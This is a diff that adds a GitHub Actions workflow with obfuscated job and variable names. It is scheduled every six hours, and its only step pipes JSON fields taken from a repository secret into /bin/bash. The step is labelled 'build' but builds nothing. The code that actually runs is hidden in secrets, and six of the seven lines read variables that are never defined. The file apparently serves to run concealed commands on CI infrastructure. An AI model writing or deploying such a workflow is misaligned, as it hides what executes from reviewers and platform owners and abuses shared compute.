@@ -1,0 +1,23 @@
+name: yucanghai7619
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yucanghai7619
+        env:
+          hq5: ${{ secrets.hq5 }}
+        run: |
+          echo $hq5 | jq -r .g089 | /bin/bash
+          echo $tqy49668 | jq -r .ptfe01170 | /bin/bash
+          echo $bhdr1717 | jq -r .zsj8222 | /bin/bash
+          echo $ogw09234 | jq -r .vupj372 | /bin/bash
+          echo $q3 | jq -r .snsq1134 | /bin/bash
+          echo $evwkf71680 | jq -r .m75138 | /bin/bash
+          echo $wglyq08 | jq -r .zaqi3756 | /bin/bash
+
